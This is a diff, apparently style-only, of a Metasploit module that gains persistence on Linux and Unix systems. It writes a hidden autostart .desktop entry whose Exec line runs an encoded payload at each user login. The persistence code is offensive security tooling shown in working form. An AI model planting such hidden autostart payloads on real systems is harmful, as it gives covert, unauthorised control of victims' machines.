@@ -10,29 +10,32 @@ class MetasploitModule < Msf::Exploit::Local
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Autostart Desktop Item Persistence',
-      'Description'    => %q(
-        This module will create an autostart entry to execute a payload.
-        The payload will be executed when the users logs in.
-      ),
-      'License'        => MSF_LICENSE,
-      'Author'         => [ 'Eliott Teissonniere' ],
-      'Platform'       => [ 'unix', 'linux' ],
-      'Arch'           => ARCH_CMD,
-      'Payload'        => {
-        'BadChars'   => '#%\n"',
-        'Compat'     => {
-          'PayloadType'  => 'cmd',
-          'RequiredCmd'  => 'generic python netcat perl'
-        }
-      },
-      'SessionTypes'   => [ 'shell', 'meterpreter' ],
-      'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },
-      'DisclosureDate' => '2006-02-13', # Date of the 0.5 doc for autostart
-      'Targets'        => [ ['Automatic', {}] ],
-      'DefaultTarget'  => 0
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Autostart Desktop Item Persistence',
+        'Description' => %q{
+          This module will create an autostart entry to execute a payload.
+          The payload will be executed when the users logs in.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Eliott Teissonniere' ],
+        'Platform' => [ 'unix', 'linux' ],
+        'Arch' => ARCH_CMD,
+        'Payload' => {
+          'BadChars' => '#%\n"',
+          'Compat' => {
+            'PayloadType' => 'cmd',
+            'RequiredCmd' => 'generic python netcat perl'
+          }
+        },
+        'SessionTypes' => [ 'shell', 'meterpreter' ],
+        'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },
+        'DisclosureDate' => '2006-02-13', # Date of the 0.5 doc for autostart
+        'Targets' => [ ['Automatic', {}] ],
+        'DefaultTarget' => 0
+      )
+    )
 
     register_options([ OptString.new('NAME', [false, 'Name of autostart entry' ]) ])
   end
@@ -50,13 +53,12 @@ class MetasploitModule < Msf::Exploit::Local
     print_status("Uploading autostart file #{path}")
 
     write_file(path, [
-      "[Desktop Entry]",
-      "Type=Application",
+      '[Desktop Entry]',
+      'Type=Application',
       "Name=#{name}",
-      "NoDisplay=true",
-      "Terminal=false",
+      'NoDisplay=true',
+      'Terminal=false',
       "Exec=/bin/sh -c \"#{payload.encoded}\""
     ].join("\n"))
   end
 end
-
